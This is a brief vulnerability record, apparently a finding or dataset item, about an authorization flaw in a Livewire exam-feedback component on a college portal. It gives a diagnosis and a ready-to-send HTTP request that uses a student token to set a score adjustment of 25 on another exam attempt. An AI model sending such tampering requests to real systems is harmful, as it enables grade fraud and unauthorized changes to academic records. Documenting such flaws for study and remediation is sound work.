diagnosis: The exam feedback Livewire component permits updating grades and bonus points by referencing a public $attemptId property. Students or unassigned teaching assistants can tamper with the attemptId in browser network traffic to inject fraudulent bonus marks or erase disciplinary remarks on exam submissions.
exploit_request:
POST /livewire/update HTTP/1.1
Host: portal.onlinecollege.edu
Authorization: Bearer 27|studenttoken4455
Content-Type: application/json

{"components": [{"snapshot": "{\"data\":{\"attemptId\":5920,\"graderFeedback\":\"Excellent\",\"scoreAdjustment\":25}}", "updates": {}, "calls": [{"method": "saveFeedback", "params": []}]}]}
